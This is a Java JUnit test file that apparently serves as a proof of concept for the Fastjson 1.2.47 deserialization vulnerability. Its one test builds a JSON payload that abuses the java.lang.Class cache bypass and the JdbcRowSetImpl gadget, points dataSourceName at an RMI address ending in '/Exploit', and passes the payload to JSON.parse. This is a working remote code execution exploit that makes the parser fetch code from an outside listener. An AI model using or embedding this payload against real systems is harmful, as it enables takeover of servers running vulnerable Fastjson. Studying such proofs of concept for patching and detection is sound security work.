package me.mole;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.junit.jupiter.api.Test;

public class Fastjson1247ApplicationTest {

    @Test
    public void test_1247_poc_1() {
        String fj_poc = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:8085/Exploit\",\"autoCommit\":true}}";
        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }
}
